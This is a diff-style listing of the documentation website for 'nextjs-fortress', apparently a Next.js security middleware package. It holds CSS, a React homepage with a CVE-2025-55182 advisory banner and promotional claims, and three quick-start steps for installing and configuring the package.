+  box-shadow: var(--shadow-red);
+  border: 3px solid var(--bg-secondary);
+}
+
+.stepContent h3 {
+  margin-bottom: 1rem;
+  color: var(--text-primary);
+  font-size: 1.3rem;
+  font-weight: 600;
+}
+
+.stepCode {
+  background: var(--bg-tertiary);
+  padding: 1rem;
+  border-radius: 8px;
+  overflow-x: auto;
+  border: 1px solid var(--border-subtle);
+}
+
+.stepCode code {
+  font-size: 0.85rem;
+  line-height: 1.6;
+  color: var(--text-secondary);
+}
+
+/* Trusted Section */
+.trustedSection {
+  padding: 4rem 2rem;
+  text-align: center;
+  background: var(--glass-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border-top: 1px solid var(--border-subtle);
+}
+
+.trustedText {
+  font-size: 1.2rem;
+  margin-bottom: 0.5rem;
+  color: var(--text-primary);
+  font-weight: 600;
+}
+
+.trustedSubtext {
+  font-size: 0.95rem;
+  color: var(--text-muted);
+}
+
+/* Responsive */
+@media screen and (max-width: 996px) {
+  .heroBanner {
+    padding: 3rem 1.5rem;
+  }
+
+  .heroMainContent {
+    padding: 2rem 1.5rem;
+  }
+
+  .fortressTitle h1 {
+    font-size: 2.5rem;
+  }
+
+  .heroSubtitle {
+    font-size: 1.3rem;
+  }
+
+  .buttons {
+    flex-direction: column;
+    gap: 0.75rem;
+  }
+
+  .buttons .button {
+    width: 100%;
+  }
+
+  .statsContainer {
+    grid-template-columns: repeat(2, 1fr);
+  }
+
+  .stepsContainer {
+    grid-template-columns: 1fr;
+  }
+}
+
+@media screen and (max-width: 640px) {
+  .heroBanner {
+    padding: 2rem 1rem;
+  }
+
+  .fortressTitle h1 {
+    font-size: 2rem;
+  }
+
+  .heroSubtitle {
+    font-size: 1.1rem;
+  }
+
+  .statsContainer {
+    grid-template-columns: 1fr;
+  }
+
+  .stat {
+    padding: 1.5rem 1rem;
+  }
+
+  .statNumber {
+    font-size: 2.5rem;
+  }
+}
+
+/* Accessibility */
+@media (prefers-reduced-motion: reduce) {
+  *,
+  *::before,
+  *::after {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: 0.01ms !important;
+  }
+}
+
+
+================================================
+FILE: src/pages/index.tsx
+================================================
+import type {ReactNode} from 'react';
+import clsx from 'clsx';
+import Link from '@docusaurus/Link';
+import useDocusaurusContext from '@docusaurus/useDocusaurusContext';
+import Layout from '@theme/Layout';
+import HomepageFeatures from '@site/src/components/HomepageFeatures';
+import Heading from '@theme/Heading';
+import { Shield, Zap, Lock, AlertTriangle } from 'lucide-react';
+import { useState, useEffect } from 'react';
+
+import styles from './index.module.css';
+
+function HomepageHeader() {
+  const {siteConfig} = useDocusaurusContext();
+  const [theme, setTheme] = useState<'dark' | 'light'>('dark');
+
+  useEffect(() => {
+    const savedTheme = (localStorage.getItem('theme') as 'dark' | 'light') || 'dark';
+    setTheme(savedTheme);
+    document.documentElement.setAttribute('data-theme', savedTheme);
+  }, []);
+
+  const toggleTheme = () => {
+    const newTheme = theme === 'dark' ? 'light' : 'dark';
+    setTheme(newTheme);
+    localStorage.setItem('theme', newTheme);
+    document.documentElement.setAttribute('data-theme', newTheme);
+  };
+
+  return (
+    <>
+      <header className={clsx('hero', styles.heroBanner)}>
+        <div className="container">
+          <div className={styles.heroContent}>
+            <div className={styles.heroMainContent}>
+              <div className={styles.fortressTitle}>
+                <Heading as="h1" className="hero__title">
+                  nextjs-fortress
+                </Heading>
+              </div>
+              
+              <p className={styles.heroSubtitle}>
+                Universal Security Validation Framework for Next.js
+              </p>
+              
+              <p className={styles.heroDescription}>
+                Protect your Next.js application from <strong>CVE-2025-55182</strong> (React2Shell) 
+                and all major attack vectors with zero configuration.
+              </p>
+
+              <div className={styles.securityBadges}>
+                <span className={styles.badge} tabIndex={0} role="status" aria-label="Protected against CVE-2025-55182">
+                  <span className={styles.badgeIcon}><Shield size={20} /></span>
+                  CVE-2025-55182 Protected
+                </span>
+                <span className={styles.badge}>
+                  <span className={styles.badgeIcon}><Zap size={20} /></span>
+                  {'<1ms Overhead'}
+                </span>
+                <span className={styles.badge}>
+                  <span className={styles.badgeIcon}><Lock size={20} /></span>
+                  7 Security Layers
+                </span>
+              </div>
+
+              <div className={styles.buttons}>
+                <Link
+                  className="button button--primary button--lg"
+                  to="/docs/quick-start">
+                  Get Started - 5 minutes
+                </Link>
+                <Link
+                  className="button button--secondary button--lg"
+                  to="/docs/intro">
+                  What is Fortress?
+                </Link>
+              </div>
+            </div>
+
+            <div className={styles.codePreview}>
+              <div className={styles.codeHeader}>
+                <span className={styles.codeDot} style={{background: '#ff5f56'}}></span>
+                <span className={styles.codeDot} style={{background: '#ffbd2e'}}></span>
+                <span className={styles.codeDot} style={{background: '#27c93f'}}></span>
+                <span className={styles.codeTitle}>middleware.ts</span>
+              </div>
+              <pre className={styles.codeContent}>
+                <code>{`import { createFortressMiddleware } from '@mindfiredigital/nextjs-fortress';
+import { fortressConfig } from './fortress.config';
+
+export const middleware = createFortressMiddleware(fortressConfig);
+
+// âœ… Your entire app is now protected!`}</code>
+              </pre>
+            </div>
+
+            <div className={styles.statsContainer}>
+              <div className={styles.stat}>
+                <div className={styles.statNumber}>7</div>
+                <div className={styles.statLabel}>Security Layers</div>
+              </div>
+              <div className={styles.stat}>
+                <div className={styles.statNumber}>{'<1ms'}</div>
+                <div className={styles.statLabel}>Overhead</div>
+              </div>
+              <div className={styles.stat}>
+                <div className={styles.statNumber}>100%</div>
+                <div className={styles.statLabel}>CVE Protected</div>
+              </div>
+              <div className={styles.stat}>
+                <div className={styles.statNumber}>0</div>
+                <div className={styles.statLabel}>Config Required</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+    </>
+  );
+}
+
+function SecurityAlert() {
+  return (
+    <div className={styles.alertBanner}>
+      <div className="container">
+        <div className={styles.alertContent}>
+          <span className={styles.alertIcon}><AlertTriangle size={24} /></span>
+          <div className={styles.alertText}>
+            <strong>Security Advisory:</strong> CVE-2025-55182 (React2Shell) is being 
+            actively exploited. Install nextjs-fortress immediately to protect your application.
+          </div>
+          <Link 
+            className="button button--danger button--sm"
+            to="/docs/cve/cve-2025-55182">
+            Learn More
+          </Link>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function QuickStart() {
+  return (
+    <section className={styles.quickStartSection}>
+      <div className="container">
+        <Heading as="h2" className={styles.sectionTitle}>
+          Protected in 3 Steps
+        </Heading>
+        
+        <div className={styles.stepsContainer}>
+          <div className={styles.step}>
+            <div className={styles.stepNumber}>1</div>
+            <div className={styles.stepContent}>
+              <h3>Install</h3>
+              <pre className={styles.stepCode}>
+                <code>npm install @mindfiredigital/nextjs-fortress</code>
+              </pre>
+            </div>
+          </div>
+
+          <div className={styles.step}>
+            <div className={styles.stepNumber}>2</div>
+            <div className={styles.stepContent}>
+              <h3>Configure</h3>
+              <pre className={styles.stepCode}>
+                <code>{`// fortress.config.ts
+export const fortressConfig = {
+  enabled: true,
+  mode: 'production',
+  modules: { /* all enabled by default */ }
+}`}</code>
+              </pre>
+            </div>
+          </div>
+
+          <div className={styles.step}>
+            <div className={styles.stepNumber}>3</div>
+            <div className={styles.stepContent}>
+              <h3>Protect</h3>
+              <pre className={styles.stepCode}>
+                <code>{`// middleware.ts
+export const middleware = createFortressMiddleware(fortressConfig);
+// Done! ðŸŽ‰`}</code>
+              </pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function TrustedBy() {
+  return (
+    <section className={styles.trustedSection}>
+      <div className="container">
+        <p className={styles.trustedText}>
+          Built by <strong>Mindfire Digital</strong>
+        </p>
+        <p className={styles.trustedSubtext}>
+          Open source â€¢ MIT License â€¢ Community Driven
+        </p>
+      </div>
+    </section>
+  );
+}
+
+export default function Home(): ReactNode {
+  return (
+    <Layout
+      title="nextjs-fortress - Universal Security for Next.js"
+      description="Protect your Next.js application from CVE-2025-55182 and all major attack vectors. Zero configuration, 7 security layers, <1ms overhead.">
+      <SecurityAlert />
+      <HomepageHeader />
+      <main>
+        <HomepageFeatures />
+        <QuickStart />
+        <TrustedBy />
+      </main>
+    </Layout>
+  );
+}
+
+
+================================================
+FILE: src/pages/markdown-page.md
+================================================
+---
+title: Markdown page example
+---
+
+# Markdown page example
+
+You don't need React to write simple standalone pages.
+
+
+
+================================================
+FILE: static/.nojekyll
+================================================
+[Empty file]
+
